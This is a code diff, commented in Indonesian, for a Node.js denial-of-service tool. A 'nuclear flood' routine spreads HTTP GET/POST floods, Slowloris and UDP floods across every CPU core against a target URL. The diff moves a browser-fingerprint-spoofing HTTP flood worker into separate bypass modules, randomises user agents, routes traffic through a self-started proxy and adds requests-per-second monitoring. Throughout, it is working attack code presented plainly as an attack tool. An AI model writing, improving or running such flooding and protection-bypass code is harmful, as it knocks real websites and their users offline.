@@ -1,8 +1,5 @@
 const cluster = require('cluster');
 const os = require('os');
-const TlsClient = require('tls-client-ng');
-const { HeaderGenerator } = require('header-generator');
-const { CookieJar } = require('tough-cookie');
 const url = require('url');
 const crypto = require('crypto');
 const http = require('http');
@@ -10,36 +7,10 @@ const net = require('net');
 const httpProxy = require('http-proxy');
 const dgram = require('dgram'); // Untuk UDP Flood
 const dns = require('dns');     // Untuk DNS resolution
+const { runHttpAttack } = require('./bypass.js');
+const { browserPersonas } = require('./extensions.js');
 
-// PASTE PROXY ANDA DI SINI (format: "http://user:pass@host:port")
-const proxyList = [
-    // "http://user1:pass1@proxy1.com:8080",
-    // "http://user2:pass2@proxy2.com:8080",
-];
 const LOCAL_PROXY_PORT = 9999;
-
-const headerGenerator = new HeaderGenerator({
-    browsers: [
-        { name: "chrome", minVersion: 120, httpVersion: "2" },
-        { name: "firefox", minVersion: 120, httpVersion: "2" },
-        { name: "edge", minVersion: 120, httpVersion: "2" },
-        { name: "safari", minVersion: 17, httpVersion: "2" },
-    ],
-    devices: ["desktop"],
-    operatingSystems: ["windows", "macos"],
-    locales: ["en-US", "en-GB", "de-DE", "fr-FR"]
-});
-
-const clientProfiles = [
-    'chrome_124',
-    'chrome_120',
-    'firefox_125',
-    'firefox_120',
-    'safari_17_2',
-    'safari_16_5',
-    'okteto_android_13',
-    'mms_21_9',
-];
 
 function startSelfMadeProxy() {
     const proxy = httpProxy.createProxyServer({});
@@ -204,10 +175,11 @@ function executeSlowlorisAttack(targetHost, targetPort, durationSeconds) {
     let localError = 0;
     let isAttackActive = true;
 
+    const randomUserAgent = browserPersonas[Math.floor(Math.random() * browserPersonas.length)].ua;
     const headers = [
         `GET /?${crypto.randomBytes(8).toString('hex')} HTTP/1.1`,
         `Host: ${targetHost}`,
-        `User-Agent: ${headerGenerator.getHeaders()['user-agent']}`,
+        `User-Agent: ${randomUserAgent}`,
         `Accept-language: en-US,en,q=0.5`,
         `Accept-encoding: gzip, deflate`,
     ].join('\r\n') + '\r\n';
@@ -265,94 +237,9 @@ function executeSlowlorisAttack(targetHost, targetPort, durationSeconds) {
     }, durationSeconds * 1000);
 }
 
-function runWorkerAttack(targetUrl, durationSeconds, attackType) {
-    const isPostAttack = attackType === 'post';
-    
-    // Konfigurasi yang disesuaikan per jenis serangan
-    const streamsPerLoop = isPostAttack ? 400 : 500;
-    // Lapor setiap ~50,000 request untuk monitoring lebih akurat dan lancar
-    const reportAfterLoops = isPostAttack ? 125 : 100; 
-    const attackName = isPostAttack ? "Bypasser POST" : "Bypasser GET";
-
-    let localSent = 0;
-    let localError = 0;
-    let loopCount = 0;
-
-    const target = url.parse(targetUrl);
-    const client = new TlsClient();
-    const cookieJar = new CookieJar();
-
-    console.log(`Worker ${process.pid} memulai serangan ${attackName} ke ${target.host} selama ${durationSeconds} detik.`);
-
-    let isAttackActive = true;
- 
-    const attack = () => {
-        const cacheBustingUrl = `${targetUrl}${targetUrl.includes('?') ? '&' : '?'}_=${crypto.randomBytes(8).toString('hex')}`;
-        const options = getBypassOptions(target, cookieJar);
-        
-        localSent++;
-
-        if (isPostAttack) {
-            const payload = getRandomPayload();
-            options.body = payload;
-            options.headers['content-type'] = 'application/json';
-            client.post(cacheBustingUrl, options).catch(() => {
-                localError++;
-            });
-        } else {
-            client.get(cacheBustingUrl, options).catch(() => {
-                localError++;
-            });
-        }
-    };
- 
-    const attackLoop = () => {
-        if (!isAttackActive) return;
-
-        for (let i = 0; i < streamsPerLoop; i++) {
-            attack();
-        }
-
-        loopCount++;
-        if (loopCount >= reportAfterLoops) {
-            if (process.send) {
-                process.send({
-                    type: 'stats',
-                    sent: localSent,
-                    error: localError
-                });
-            }
-            localSent = 0;
-            localError = 0;
-            loopCount = 0;
-        }
-
-        setImmediate(attackLoop);
-    };
-
-    attackLoop();
-
-    setTimeout(() => {
-        isAttackActive = false;
-
-        // Kirim sisa statistik sebelum keluar
-        if (process.send && (localSent > 0 || localError > 0)) {
-            process.send({
-                type: 'stats',
-                sent: localSent,
-                error: localError
-            });
-        }
-
-        console.log(`Worker ${process.pid} telah menghentikan serangan ${attackName} ke ${target.host}.`);
-        process.exit(0);
-    }, durationSeconds * 1000);
-}
-
 function startNuclearFlood(targetUrl, durationSeconds, statusCallback) { // This function runs in the master process
     if (cluster.isPrimary) { // Master process logic
         const selfMadeProxyUrl = startSelfMadeProxy();
-        proxyList.push(selfMadeProxyUrl);
 
         console.log(`Master ${process.pid} menyiapkan cluster untuk serangan.`);
         
@@ -364,11 +251,17 @@ function startNuclearFlood(targetUrl, durationSeconds, statusCallback) { // This
 
         let totalSent = 0;
         let totalError = 0;
+        let lastTotalSent = 0;
+        let currentRps = 0;
         let secondsRemaining = durationSeconds;
 
         const monitorInterval = setInterval(() => {
             secondsRemaining -= 5;
             if (secondsRemaining < 0) secondsRemaining = 0;
+
+            // Hitung RPS (Requests Per Second) selama interval 5 detik terakhir
+            currentRps = Math.round((totalSent - lastTotalSent) / 5);
+            lastTotalSent = totalSent;
 
             const successRate = totalSent > 0 ? ((totalSent - totalError) / totalSent * 100).toFixed(2) : "0.00";
 
@@ -376,7 +269,8 @@ function startNuclearFlood(targetUrl, durationSeconds, statusCallback) { // This
                 totalSent,
                 totalError,
                 successRate,
-                secondsRemaining
+                secondsRemaining,
+                rps: currentRps
             });
 
             if (secondsRemaining <= 0) {
@@ -384,13 +278,15 @@ function startNuclearFlood(targetUrl, durationSeconds, statusCallback) { // This
             }
         }, 5000);
 
-        // Gunakan semua core CPU untuk performa maksimal
         const numCPUs = os.cpus().length;
         const attackMethods = ['get', 'post', 'slowloris', 'udp'];
         
         for (let i = 0; i < numCPUs; i++) {
             const workerAttackType = attackMethods[i % attackMethods.length];
-            const worker = cluster.fork({ ATTACK_TYPE: workerAttackType });
+            const worker = cluster.fork({ 
+                ATTACK_TYPE: workerAttackType,
+                PROXY_URL: selfMadeProxyUrl
+            });
             worker.on('message', (message) => {
                 if (message.type === 'stats') {
                     totalSent += message.sent || 0;
@@ -418,6 +314,13 @@ function startNuclearFlood(targetUrl, durationSeconds, statusCallback) { // This
 }
 
 if (cluster.isWorker) { // Worker process logic
+    const { proxyList } = require('./extensions.js');
+    // Terima URL proxy dari master dan tambahkan ke daftar proxy worker
+    const proxyUrlFromMaster = process.env.PROXY_URL;
+    if (proxyUrlFromMaster) {
+        proxyList.push(proxyUrlFromMaster);
+    }
+
     const [targetUrl, durationSeconds] = process.argv.slice(2);
     const workerAttackType = process.env.ATTACK_TYPE;
     const parsedUrl = url.parse(targetUrl);
@@ -426,7 +329,7 @@ if (cluster.isWorker) { // Worker process logic
     switch (workerAttackType) {
         case 'get':
         case 'post':
-            runWorkerAttack(targetUrl, duration, workerAttackType);
+            runHttpAttack(targetUrl, duration, workerAttackType);
             break;
         case 'slowloris':
             const slowlorisPort = parsedUrl.protocol === 'https:' ? 443 : 80;
